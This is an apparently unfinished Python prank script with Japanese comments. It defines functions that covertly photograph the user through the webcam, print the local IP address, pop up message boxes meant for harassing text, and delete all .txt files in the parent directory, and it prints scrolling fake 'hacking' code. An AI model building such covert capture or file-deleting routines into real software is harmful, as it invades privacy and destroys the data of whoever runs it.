import os
import glob
import cv2
import datetime
import socket
import tkinter as tk
import tkinter.messagebox
import time

root = tk.Tk()
root.withdraw()

# ファイルを作成する
# for文で回数ぶん回すのも面白いかもしれない
def folder():
    path = './img'
    os.mkdir(path)

#内蔵カメラで写真撮影される
def photo():
    fileName = "photo_" + datetime.datetime.today().strftime('%Y%m%d_%H%M%S') + ".png"
    # 内蔵カメラのデバイスIDは0、USBで接続したカメラは1以降。
    capture = cv2.VideoCapture(0)
    # 取得した画像データは変数imageに格納。retは取得成功変数。
    ret, image = capture.read()
    if ret == True:

        # 取得した画像を出力。fileNameは出力する画像名。
        cv2.imwrite(fileName, image)
        print("taking picture is completed!!")

#IPアドレスを表示させる
def ip():
    print(socket.gethostbyname(socket.gethostname()))

# メッセージボックスの表示
# ここで色々と嫌がらせメッセージを記述する
def show():
    tkinter.messagebox.showinfo('info')

#ファイルを削除する
file_list = glob.glob("../*txt")
def deleat():
    for file in file_list:
        print("remove:{0}".format(file))
        os.remove(file)

#ハッキングしているかのような文字が表示される
#秒間で表示したいが現時点でできていない
hack_message = "sds sdsnewlen(const void *init, size_t initlen) { \n    struct sdshdr *sh; sh = zmalloc(sizeof(struct sdshdr)+initlen+1); \n#ifdef SDS_ABORT_ON_OOM \nif (sh == NULL) sdsOomAbort();\n#else\n    if (sh == NULL) return NULL; \n#endif \nsh->len = initlen; \nsh->free = 0;\n if (initlen) { \nif (init) memcpy(sh->buf, init, initlen);\n     else memset(sh->buf,0,initlen); \n }\nsh->buf[initlen] = '0';\nreturn (char*)sh->buf; \n} "
for ch in hack_message:
    print(ch)
    time.sleep(0.01)
# if ch == ' ':
#     print('')
if __name__ == "__main__":
    print("hoge")